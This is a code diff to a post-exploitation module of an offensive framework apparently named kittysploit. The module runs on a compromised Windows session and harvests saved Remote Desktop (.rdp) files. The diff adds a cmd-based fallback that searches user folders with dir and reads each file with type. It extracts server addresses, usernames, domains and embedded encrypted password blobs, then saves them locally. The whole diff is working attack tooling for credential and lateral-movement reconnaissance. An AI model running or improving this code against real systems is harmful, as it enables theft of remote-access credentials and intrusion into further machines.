@@ -6,6 +6,7 @@ Enumerate and parse saved .rdp client files on a Windows session.
 """
 
 from kittysploit import *
+from lib.post.windows.session import win_compat_failure_type, win_probe_powershell
 import base64
 import os
 import re
@@ -88,6 +89,12 @@ class Module(Post):
     }
 
     save_local = OptBool(True, "Save results under ./output", False)
+    prefer_powershell = OptBool(
+        False,
+        "Prefer PowerShell when available (default: dir/type via cmd)",
+        False,
+        True,
+    )
 
     def _execute_cmd(self, command: str) -> str:
         if not command:
@@ -169,11 +176,73 @@ $sections -join "`n`n"
 """
 
     def check(self):
-        ps_check = self._execute_cmd('powershell -NoP -Command "Write-Output 1"')
-        if "1" not in ps_check:
-            print_error("PowerShell is not available on the target")
-            return False
         return True
+
+    def _extract_via_cmd(self) -> str:
+        search_globs = (
+            r"%USERPROFILE%\Documents\*.rdp",
+            r"%USERPROFILE%\Desktop\*.rdp",
+            r"%USERPROFILE%\Documents\Default.rdp",
+            r"%APPDATA%\Microsoft\Windows\Recent\*.rdp",
+        )
+        found = []
+        seen = set()
+        for pattern in search_globs:
+            listing = self._execute_cmd(f'dir /b /s "{pattern}" 2>nul')
+            if not listing:
+                # Default.rdp may not recurse; try exist
+                if "*" not in pattern:
+                    exists = self._execute_cmd(
+                        f'if exist "{pattern}" (echo {pattern}) else (echo MISSING)'
+                    )
+                    if exists and "MISSING" not in exists:
+                        listing = pattern
+            for line in (listing or "").splitlines():
+                path = line.strip()
+                if not path or not path.lower().endswith(".rdp"):
+                    continue
+                key = path.lower()
+                if key in seen:
+                    continue
+                seen.add(key)
+                found.append(path)
+
+        if not found:
+            return "No .rdp files found in common user locations."
+
+        interesting = (
+            "full address:s:",
+            "username:s:",
+            "domain:s:",
+            "alternate shell:s:",
+            "drivestoredirect:s:",
+            "redirectclipboard:i:",
+            "redirectprinters:i:",
+            "authentication level:i:",
+            "prompt for credentials:i:",
+            "password 51:b:",
+        )
+        sections = []
+        for path in found:
+            content = self._execute_cmd(f'type "{path}"')
+            lines = (content or "").splitlines()
+            picked = []
+            has_pwd = False
+            for line in lines:
+                low = line.strip().lower()
+                if low.startswith("password 51:b:"):
+                    has_pwd = True
+                if any(low.startswith(k) for k in interesting):
+                    picked.append(line.rstrip())
+            if not picked:
+                picked = [l.rstrip() for l in lines[:25]]
+            note = (
+                "\n(note: embedded password is DPAPI/CredSSP encrypted)"
+                if has_pwd
+                else ""
+            )
+            sections.append(f"=== {path} ===\n" + "\n".join(picked) + note)
+        return "\n\n".join(sections)
 
     def _save_output(self, content: str) -> str:
         os.makedirs(_LOCAL_OUT, exist_ok=True)
@@ -185,10 +254,17 @@ $sections -join "`n`n"
 
     def run(self):
         if not self.check():
-            raise ProcedureError(FailureType.NotCompatible, "PowerShell is not available on the target")
+            raise ProcedureError(win_compat_failure_type(), "RDP dump prerequisites not met")
 
         print_status("Searching saved .rdp files...")
-        result = self._run_powershell(self._powershell_script())
+        use_ps = self._bool_opt(self.prefer_powershell, False) and win_probe_powershell(self._execute_cmd)
+        if use_ps:
+            print_info("Using PowerShell")
+            result = self._run_powershell(self._powershell_script())
+        else:
+            if self._bool_opt(self.prefer_powershell, False):
+                print_warning("PowerShell preferred but not available — falling back to dir/type")
+            result = self._extract_via_cmd()
 
         if not result:
             raise ProcedureError(FailureType.Unknown, "No output was returned")
